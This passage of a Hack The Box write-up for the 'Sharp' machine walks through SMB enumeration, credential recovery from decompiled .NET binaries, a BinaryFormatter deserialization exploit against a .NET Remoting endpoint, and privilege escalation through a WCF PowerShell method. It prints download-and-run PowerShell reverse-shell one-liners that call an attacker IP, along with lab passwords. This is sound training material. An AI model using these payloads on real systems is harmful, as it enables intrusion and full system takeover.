+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(root💀kali)-[/home/kali/HackTheBox/Sharp]
+</span></span><span style="display:flex;"><span>└─# cat 10.10.10.219_lars_spider.json | grep -v <span style="color:#87ceeb">&#39;time\|size&#39;</span> | grep <span style="color:#87ceeb">&#39;: {&#39;</span> | awk -F<span style="color:#87ceeb">\&#34;</span> <span style="color:#87ceeb">&#39;{print $2}&#39;</span>  
+</span></span><span style="display:flex;"><span>IPC$			<span style="color:#0f0"># directory</span>
+</span></span><span style="display:flex;"><span>InitShutdown
+</span></span><span style="display:flex;"><span>LSM_API_service
+</span></span><span style="display:flex;"><span>PIPE_EVENTROOT<span style="color:#87ceeb">\\</span>CIMV2SCM EVENT PROVIDER
+</span></span><span style="display:flex;"><span>PSHost.132655164003465770.3392.DefaultAppDomain.powershell
+</span></span><span style="display:flex;"><span>W32TIME_ALT
+</span></span><span style="display:flex;"><span>Winsock2<span style="color:#87ceeb">\\</span>CatalogChangeListener-154-0
+</span></span><span style="display:flex;"><span>Winsock2<span style="color:#87ceeb">\\</span>CatalogChangeListener-1dc-0
+</span></span><span style="display:flex;"><span>Winsock2<span style="color:#87ceeb">\\</span>CatalogChangeListener-268-0
+</span></span><span style="display:flex;"><span>Winsock2<span style="color:#87ceeb">\\</span>CatalogChangeListener-274-0
+</span></span><span style="display:flex;"><span>Winsock2<span style="color:#87ceeb">\\</span>CatalogChangeListener-36c-0
+</span></span><span style="display:flex;"><span>Winsock2<span style="color:#87ceeb">\\</span>CatalogChangeListener-42c-0
+</span></span><span style="display:flex;"><span>atsvc
+</span></span><span style="display:flex;"><span>epmapper
+</span></span><span style="display:flex;"><span>eventlog
+</span></span><span style="display:flex;"><span>lsass
+</span></span><span style="display:flex;"><span>ntsvcs
+</span></span><span style="display:flex;"><span>scerpc
+</span></span><span style="display:flex;"><span>srvsvc
+</span></span><span style="display:flex;"><span>vgauth-service
+</span></span><span style="display:flex;"><span>wkssvc
+</span></span><span style="display:flex;"><span>dev				<span style="color:#0f0"># directory</span>
+</span></span><span style="display:flex;"><span>Client.exe
+</span></span><span style="display:flex;"><span>RemotingLibrary.dll
+</span></span><span style="display:flex;"><span>Server.exe
+</span></span><span style="display:flex;"><span>notes.txt
+</span></span></code></pre></div><p>While searching <code>lars</code> files, only those in <code>\\dev</code> seem important.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(root💀kali)-[/home/…/HackTheBox/Sharp/smb/lars]
+</span></span><span style="display:flex;"><span>└─# smbclient -U <span style="color:#87ceeb">&#39;lars&#39;</span> //10.10.10.219/dev G123HHrth234gRG                                    <span style="color:#f60">130</span> ⨯
+</span></span><span style="display:flex;"><span>Try <span style="color:#87ceeb">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#87ceeb">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#f60">0</span>  Sun Nov <span style="color:#f60">15</span> 06:30:13 <span style="color:#f60">2020</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#f60">0</span>  Sun Nov <span style="color:#f60">15</span> 06:30:13 <span style="color:#f60">2020</span>
+</span></span><span style="display:flex;"><span>  Client.exe                          A     <span style="color:#f60">5632</span>  Sun Nov <span style="color:#f60">15</span> 05:25:01 <span style="color:#f60">2020</span>
+</span></span><span style="display:flex;"><span>  notes.txt                           A       <span style="color:#f60">70</span>  Sun Nov <span style="color:#f60">15</span> 08:59:02 <span style="color:#f60">2020</span>
+</span></span><span style="display:flex;"><span>  RemotingLibrary.dll                 A     <span style="color:#f60">4096</span>  Sun Nov <span style="color:#f60">15</span> 05:25:01 <span style="color:#f60">2020</span>
+</span></span><span style="display:flex;"><span>  Server.exe                          A     <span style="color:#f60">6144</span>  Mon Nov <span style="color:#f60">16</span> 06:55:44 <span style="color:#f60">2020</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># notes.txt</span>
+</span></span><span style="display:flex;"><span>Todo:
+</span></span><span style="display:flex;"><span>    Migrate from .Net remoting to WCF	<span style="color:#0f0"># This might be our hint</span>
+</span></span><span style="display:flex;"><span>    Add input validation
+</span></span></code></pre></div><p>Two executables <code>Client.exe</code> and <code>Server.exe</code>, as well as their library, are also built in C#  so we can decompile them with dnSpy.</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-02.png"></p>
+<p>Then we have a <em>secret</em> endpoint listening on port <code>8888</code> with its username and password hardcoded in <code>Client.exe</code></p>
+<p><img alt="Client.exe" src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-06.png"></p>
+<p>The credentials are to be tested with CME whether they are valid.</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-12.png"></p>
+<h3 id="credentials-acquired-1"><a class="h-anchor" href="#credentials-acquired-1">Credentials acquired</a></h3>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>debug</td>
+<td>SharpApplicationDebugUserPassword123!</td>
+<td>Valid</td>
+</tr>
+<tr>
+<td>Administrator</td>
+<td>G2@$btRSHJYTarg</td>
+<td>Invalid</td>
+</tr>
+<tr>
+<td>lars</td>
+<td>G123HHrth234gRG</td>
+<td>Valid</td>
+</tr>
+</tbody>
+</table>
+<h2 id="exploit-local-net-debug-service"><a class="h-anchor" href="#exploit-local-net-debug-service">Exploit local .NET debug service</a></h2>
+<p>As <code>debug</code> profile contains nothing but some useless folders (<code>IPC$</code>, <code>dev</code> and similarities for lars), we have to figure out how to connect to the endpoint on port 8888. Back to the <code>notes.txt</code>, I thought there is something to do with the .NET service and came across these two repos. You can take a look yourselves.</p>
+<p><a href="https://github.com/tyranid/ExploitRemotingService">https://github.com/tyranid/ExploitRemotingService</a></p>
+<blockquote>
+<p>A tool to exploit .NET Remoting Services vulnerable to CVE-2014-1806 or CVE-2014-4149. It only works on Windows although some aspects <em>might</em> work in Mono on *nix.</p>
+</blockquote>
+<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a> (basically our payload wrapper)</p>
+<blockquote>
+<p><strong>ysoserial</strong> is a collection of utilities and property-oriented programming &ldquo;gadget chains&rdquo; discovered in common java libraries that can, under the right conditions, exploit Java applications performing <strong>unsafe deserialization</strong> of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host</p>
+</blockquote>
+<p>We will use <em>ysoserial</em> to wrap our reverse-tcp PowerShell one-liner<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> and call <em>ExploitRemotingService.exe</em> to pipe our wrapped payload into the mentioned vulnerable endpoint.</p>
+<h3 id="payload-crafting-and-network-configuration"><a class="h-anchor" href="#payload-crafting-and-network-configuration">Payload crafting and Network configuration</a></h3>
+<h4 id="useful-poc2-repositories"><a class="h-anchor" href="#useful-poc2-repositories">Useful PoC<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> repositories</a></h4>
+<p>Because ExploitRemotingService doesn&rsquo;t provide us any release versions so we have to download and build the project manually with Visual Studio on our Windows VM<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>.</p>
+<p>Additionally, I have to install <a href="http://www.ndesk.org/Options">NDesk Options</a> library in order to successfully compile the solution.</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_11-27.png"></p>
+<p><code>ysoserial</code> has their portable version so we can simply download, unzip and use it.</p>
+<p>Here is a brief look of <code>Server.exe</code> source code decompiled by dnSpy. The server is running on port <code>8888</code> with BinaryFormatter sink implemented. You can read about the details <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.remoting.channels.binaryserverformattersink?view=netframework-4.8">here</a>; simply put, we just need <code>ysoserial</code> to wrap our payload in BinaryFormatter mode.</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_11-41.png"></p>
+<p>Below is our crafting steps with <code>ysoserial</code> and <code>ExploitRemotingService</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#0f0">### ysoserial.exe</span>
+</span></span><span style="display:flex;"><span>C:\Users\User\Desktop\ysoserial-<span style="color:#f60">1.34</span>\Release&gt;ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c <span style="color:#87ceeb">&#34;powershell IEX(new-object net.webclient).downloadString(&#39;http://10.10.16.3/reverse.ps1&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Breakdown</span>
+</span></span><span style="display:flex;"><span>-f Formatter as BinaryFormatter
+</span></span><span style="display:flex;"><span>-g TypeConfuseDelegate gadget
+</span></span><span style="display:flex;"><span>-o Base64 output
+</span></span><span style="display:flex;"><span>-c Create a reverse connection back to our IP using Powershell one-liner called reverse.ps1
+</span></span><span style="display:flex;"><span>IEX(New-Object Net.WebClient).downloadString(<span style="color:#87ceeb">&#39;http://10.10.16.3/reverse.ps1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">### ExploitRemotingService.exe</span>
+</span></span><span style="display:flex;"><span>C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Release&gt;ExploitRemotingService.exe -s --user=debug --pass=<span style="color:#87ceeb">&#34;SharpApplicationDebugUserPassword123!&#34;</span> tcp://<span style="color:#f60">10.10</span>.10.<span style="color:#f60">219</span>:<span style="color:#f60">8888</span>/SecretSharpDebugApplicationEndpoint raw &lt;wrapped payload&gt;
+</span></span></code></pre></div><h4 id="network-re-routing-on-windows-and-linux"><a class="h-anchor" href="#network-re-routing-on-windows-and-linux">Network re-routing on Windows and Linux</a></h4>
+<p>Before we can send our payload to target host, remember that currently our Linux machine is the only one can connect to HTB VPN, not our Windows. In order to establish a connection between Windows and HTB VPN, we have to do some routing.</p>
+<p>The following section helps us turn Kali into a router and act as the gateway.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0"># Windows</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># We want to route any HTB connection to our Kali machine NAT-IP</span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#87ceeb">\W</span>indows<span style="color:#87ceeb">\s</span>ystem32&gt;route add 10.10.10.0 mask 255.255.255.0 192.168.157.133
+</span></span><span style="display:flex;"><span> OK!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">#	----------------------------------------------</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Linux</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Enable IP Forwarding</span>
+</span></span><span style="display:flex;"><span>$ echo <span style="color:#f60">1</span> | sudo tee /proc/sys/net/ipv4/ip_forward 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Configurate iptables&#39; rules to manage incomming packets</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># This rule forwards packets from HTB to our Windows machine</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Breakdown: Forwarding chain for connection from tun0 to eth0 interface with related and/or established state</span>
+</span></span><span style="display:flex;"><span>$ iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Accept packets sending back from Windows machine</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Breakdown: Receive packets from Windows through eth0 interface then pass it on tun0 and send them to HTB</span>
+</span></span><span style="display:flex;"><span>$ iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Re-routing NAT from HTB machine back to Windows</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Breakdown: Create a NAT table with POSTROUTING chain that accept only IP from the source of eth0 and pass it through tun0 with MASQUERADE policy</span>
+</span></span><span style="display:flex;"><span>$ iptables -t nat -A POSTROUTING -s 192.168.157.0/24 -o tun0 -j MASQUERADE 
+</span></span></code></pre></div><h3 id="powershell-reverse-connection"><a class="h-anchor" href="#powershell-reverse-connection">PowerShell Reverse Connection</a></h3>
+<p>Finally, our Windows is able to send/receive packets from HTB machine through Kali.</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_12-49.png"></p>
+<p>Now we can send our payload to target remote host and wait for our reverse shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#0f0">### ExploitRemotingService.exe</span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#87ceeb">\U</span>sers<span style="color:#87ceeb">\U</span>ser<span style="color:#87ceeb">\D</span>esktop<span style="color:#87ceeb">\E</span>xploitRemotingService-master<span style="color:#87ceeb">\E</span>xploitRemotingService<span style="color:#87ceeb">\b</span>in<span style="color:#87ceeb">\R</span>elease&gt;ExploitRemotingService.exe -s --user=debug --pass=<span style="color:#87ceeb">&#34;SharpApplicationDebugUserPassword123!&#34;</span> tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw &lt;wrapped payload&gt;
+</span></span></code></pre></div><p>After execute the above command, we has established a reverse PowerShell as user <code>lars</code>.</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_13-17.png"></p>
+<p>Browsing through <code>lars</code> directories, there is a <code>wcf</code> folder in Documents. This has also been mentioned in <code>notes.txt</code> about migrating the project from dotNET to WCF, so it might be the answer. Anyway, the machine&rsquo;s user flag is located in <code>C:\Users\lars\Desktop\user.txt</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>    Directory: C:\Users\lars\Documents\wcf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name                                                                  
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----                                                                  
+</span></span><span style="display:flex;"><span>d-----       <span style="color:#f60">11</span>/<span style="color:#f60">15</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">1</span>:<span style="color:#f60">40</span> PM                .vs                                                                   
+</span></span><span style="display:flex;"><span>d-----       <span style="color:#f60">11</span>/<span style="color:#f60">15</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">1</span>:<span style="color:#f60">40</span> PM                Client                                                                
+</span></span><span style="display:flex;"><span>d-----       <span style="color:#f60">11</span>/<span style="color:#f60">15</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">1</span>:<span style="color:#f60">40</span> PM                packages                                                              
+</span></span><span style="display:flex;"><span>d-----       <span style="color:#f60">11</span>/<span style="color:#f60">15</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">1</span>:<span style="color:#f60">40</span> PM                RemotingLibrary                                                       
+</span></span><span style="display:flex;"><span>d-----       <span style="color:#f60">11</span>/<span style="color:#f60">15</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">1</span>:<span style="color:#f60">41</span> PM                Server                                                                
+</span></span><span style="display:flex;"><span>-a----       <span style="color:#f60">11</span>/<span style="color:#f60">15</span>/<span style="color:#f60">2020</span>  <span style="color:#f60">12</span>:<span style="color:#f60">47</span> PM           <span style="color:#f60">2095</span> wcf.sln                                                               
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:\Users\lars\Documents\wcf&gt; 
+</span></span></code></pre></div><p>Let&rsquo;s compress the wcf directory into <code>wcf.zip</code> then download it to our Linux shared directory</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-09.png"></p>
+<h3 id="another-secret-endpoint-and-flag"><a class="h-anchor" href="#another-secret-endpoint-and-flag">Another secret endpoint and &hellip;flag!</a></h3>
+<p>It turns out <code>wcf.zip</code> is also a C# project with source code inside, we can put it in Visual Studio and view the source. There is another secret endpoint that is currently running on port 8889 of the remote host.</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-22.png"></p>
+<p>Since we are in the same network with remote target, you can try change the IP to the machine (10.10.10.219) and run the code. But there is a problem.</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-29.png"></p>
+<p>We can&rsquo;t connect to our target because of invalid credentials. This program was meant to run as internal users of the remote host (like <code>lars</code> or <code>debug</code>). To impersonate <code>lars</code>, we will run our command-prompt with his net-username as following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#0f0"># Also type lars password when prompted</span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#87ceeb">\W</span>indows<span style="color:#87ceeb">\s</span>ystem32&gt;runas /user:lars /netonly %ComSpec%
+</span></span></code></pre></div><p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-33.png"></p>
+<p>Now we are <code>lars</code> in his server, move to our malformed <code>wcf</code> project and run it again.</p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-36.png"></p>
+<p>Successfully executed as <code>lars</code>. Now we will use the project&rsquo;s built-in function <code>InvokePowerShell</code> to escalate our privilege.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>        <span style="color:#f00">public</span> <span style="color:#ee82ee">string</span> InvokePowerShell(<span style="color:#ee82ee">string</span> scriptText)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            Runspace runspace = RunspaceFactory.CreateRunspace();
+</span></span><span style="display:flex;"><span>            runspace.Open();
+</span></span><span style="display:flex;"><span>            Pipeline pipeline = runspace.CreatePipeline();
+</span></span><span style="display:flex;"><span>            pipeline.Commands.AddScript(scriptText);
+</span></span><span style="display:flex;"><span>            pipeline.Commands.Add(<span style="color:#87ceeb">&#34;Out-String&#34;</span>);
+</span></span><span style="display:flex;"><span>            Collection &lt;PSObject&gt; results = pipeline.Invoke();
+</span></span><span style="display:flex;"><span>            runspace.Close();
+</span></span><span style="display:flex;"><span>            StringBuilder stringBuilder = <span style="color:#f00">new</span> StringBuilder();
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">foreach</span> (PSObject obj <span style="color:#f00">in</span> results)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                stringBuilder.AppendLine(obj.ToString());
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">return</span> stringBuilder.ToString();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p><code>Client.cs</code> is to be changed as below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#f00">namespace</span> Client {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">public</span> <span style="color:#f00">class</span> Client
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">public</span> <span style="color:#f00">static</span> <span style="color:#f00">void</span> Main() {
+</span></span><span style="display:flex;"><span>            ChannelFactory&lt;IWcfService&gt; channelFactory = <span style="color:#f00">new</span> ChannelFactory&lt;IWcfService&gt;(
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">new</span> NetTcpBinding(SecurityMode.Transport),<span style="color:#87ceeb">&#34;net.tcp://10.10.10.219:8889/wcf/NewSecretWcfEndpoint&#34;</span>
+</span></span><span style="display:flex;"><span>            );
+</span></span><span style="display:flex;"><span>            IWcfService client = channelFactory.CreateChannel();
+</span></span><span style="display:flex;"><span>            Console.WriteLine(client.InvokePowerShell(<span style="color:#87ceeb">&#34;IEX(New-Object Net.WebClient).downloadString(&#39;10.10.16.3/reverse.ps1&#39;)&#34;</span>));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>Re-build the project then execute <code>Client.exe</code> as <code>lars</code> gives us our reverse shell as <code>nt-authority system</code></p>
+<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-46.png"></p>
+<p>And the flag is located in <code>C:\Users\Administrator\Desktop\root.txt</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cd C:\Users\Administrator
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:\Users\Administrator
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name                                                                   
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----                                                                   
+</span></span><span style="display:flex;"><span>d-r---       <span style="color:#f60">11</span>/<span style="color:#f60">12</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">5</span>:<span style="color:#f60">15</span> PM                <span style="color:#f60">3D</span> Objects                                                             
+</span></span><span style="display:flex;"><span>d-r---       <span style="color:#f60">11</span>/<span style="color:#f60">12</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">5</span>:<span style="color:#f60">15</span> PM                Contacts                                                               
+</span></span><span style="display:flex;"><span>d-r---       <span style="color:#f60">11</span>/<span style="color:#f60">15</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">1</span>:<span style="color:#f60">42</span> PM                Desktop                                                                
+</span></span><span style="display:flex;"><span>d-r---       <span style="color:#f60">11</span>/<span style="color:#f60">15</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">1</span>:<span style="color:#f60">46</span> PM                Documents                                                              
+</span></span><span style="display:flex;"><span>d-r---       <span style="color:#f60">11</span>/<span style="color:#f60">12</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">5</span>:<span style="color:#f60">15</span> PM                Downloads                                                              
+</span></span><span style="display:flex;"><span>d-r---       <span style="color:#f60">11</span>/<span style="color:#f60">12</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">5</span>:<span style="color:#f60">15</span> PM                Favorites                                                              
+</span></span><span style="display:flex;"><span>d-r---       <span style="color:#f60">11</span>/<span style="color:#f60">12</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">5</span>:<span style="color:#f60">15</span> PM                Links                                                                  
+</span></span><span style="display:flex;"><span>d-r---       <span style="color:#f60">11</span>/<span style="color:#f60">12</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">5</span>:<span style="color:#f60">15</span> PM                Music                                                                  
+</span></span><span style="display:flex;"><span>d-r---       <span style="color:#f60">11</span>/<span style="color:#f60">12</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">5</span>:<span style="color:#f60">15</span> PM                Pictures                                                               
+</span></span><span style="display:flex;"><span>d-r---       <span style="color:#f60">11</span>/<span style="color:#f60">12</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">5</span>:<span style="color:#f60">15</span> PM                Saved Games                                                            
+</span></span><span style="display:flex;"><span>d-r---       <span style="color:#f60">11</span>/<span style="color:#f60">12</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">5</span>:<span style="color:#f60">15</span> PM                Searches                                                               
+</span></span><span style="display:flex;"><span>d-r---       <span style="color:#f60">11</span>/<span style="color:#f60">12</span>/<span style="color:#f60">2020</span>   <span style="color:#f60">5</span>:<span style="color:#f60">15</span> PM                Videos                                                                 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd Desktop
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:\Users\Administrator\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name                                                                   
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----                                                                   
+</span></span><span style="display:flex;"><span>-ar---        <span style="color:#f60">5</span>/<span style="color:#f60">14</span>/<span style="color:#f60">2021</span>   <span style="color:#f60">6</span>:<span style="color:#f60">02</span> AM             <span style="color:#f60">34</span> root.txt                                                               
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat root.txt
+</span></span><span style="display:flex;"><span>[<span style="color:#7fffd4">REDACTED</span>]
+</span></span><span style="display:flex;"><span>PS C:\Users\Administrator\Desktop&gt; 
+</span></span></code></pre></div><h2 id="footnotes"><a class="h-anchor" href="#footnotes">Footnotes</a></h2>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p>See more about PowerShell one-liner: <a href="https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf">https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2">
+<p>Proof of Concept&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3">
+<p>Virtual Machine&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+
+</article>
+
+            </div>
+        </main>
+    </body></html>
